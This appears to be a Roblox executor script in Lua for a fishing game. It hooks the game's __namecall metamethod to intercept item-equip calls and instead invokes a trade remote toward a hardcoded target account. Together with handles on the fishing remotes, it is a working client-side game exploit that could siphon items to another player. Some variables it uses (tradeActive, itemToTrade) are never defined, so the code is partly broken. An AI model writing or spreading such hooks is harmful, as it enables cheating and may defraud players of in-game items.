--ACTIVATE SIMPLE TRADER
-------------------------------------------
----- =======[ GLOBAL FUNCTION ]
-------------------------------------------
print("Begin trader script")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local net = ReplicatedStorage:WaitForChild("Packages")
	:WaitForChild("_Index")
	:WaitForChild("sleitnick_net@0.2.0")
	:WaitForChild("net")

local rodRemote = net:WaitForChild("RF/ChargeFishingRod")
local miniGameRemote = net:WaitForChild("RF/RequestFishingMinigameStarted")
local finishRemote = net:WaitForChild("RE/FishingCompleted")

local Player = Players.LocalPlayer
local XPBar = Player:WaitForChild("PlayerGui"):WaitForChild("XP")

-- TRADER_REMOTES :
local RemoteEventTextNotifications = game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_net@0.2.0").net:FindFirstChild("RE/TextNotification")
local RemoteArrayUpdateReplions = game:GetService("ReplicatedStorage").Packages._Index["ytrev_replion@2.0.0-rc.3"].replion["Remotes"].ArrayUpdate


-------------------------------------------
---GET USERNAME
-------------------------------------------
local targetUserId = nil
local targetUserName = nil
function setUserID(displayName)
    for _, player in ipairs(Players:GetPlayers()) do
         if player.DisplayName == displayName or player.Name == displayName then
            targetUserName = player.DisplayName
            targetUserId = player.UserId
            print("Target UserName : " .. targetUserName)
            print("Target UserId : " .. targetUserId)
            return
        end
    end
end

setUserID("floidcorge")
task.wait(2)

local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall

setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
   local args = {...}
   local method = getnamecallmethod()

   if tradeActive and tostring(self) == "RE/EquipItem" and method == "FireServer" then
      local uuid = args[1]
      if uuid and targetUserId then
        task.spawn(function()
            pcall(function()
                ---FILL AUTO TRADE SCRIPT HERE
                local initiateTrade = net:WaitForChild("RF/InitiateTrade")
                local uuid = itemToTrade[1]
                initiateTrade:InvokeServer(targetUserId, uuid)
                ---END FILLED
                task.wait(0.1)
            end)
        end)
      else
      end
      return nil
   end

   return oldNamecall(self, unpack(args))
end)
setreadonly(mt, true)
print("script trader set")
